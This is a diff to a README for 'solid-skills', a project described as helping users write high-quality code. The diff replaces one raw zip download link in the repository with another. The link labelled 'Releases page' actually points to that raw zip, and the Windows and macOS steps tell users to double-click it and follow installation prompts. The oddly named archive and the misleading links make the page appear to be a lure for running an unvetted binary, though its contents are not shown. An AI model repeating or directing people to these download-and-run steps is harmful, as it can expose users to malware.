@@ -16,9 +16,9 @@ Welcome to **solid-skills**! This application helps you write high-quality code 
 
 You can easily download this application from our Releases page. 
 
-[![Download solid-skills](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/solid-skills-pyrrodiazole.zip)](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/solid-skills-pyrrodiazole.zip)
+[![Download solid-skills](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip)](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip)
 
-To download, visit this page: [solid-skills Releases](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/solid-skills-pyrrodiazole.zip).
+To download, visit this page: [solid-skills Releases](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
 
 ### Steps to Download
 
@@ -33,11 +33,11 @@ To download, visit this page: [solid-skills Releases](https://github.com/NotieGa
 After downloading:
 
 1. **Windows**:
-   - Double-click on the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/solid-skills-pyrrodiazole.zip).
+   - Double-click on the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
    - Follow the installation prompts.
 
 2. **macOS**:
-   - Double-click the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/solid-skills-pyrrodiazole.zip).
+   - Double-click the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
    - Drag the application into your Applications folder.
 
 3. **Linux**:
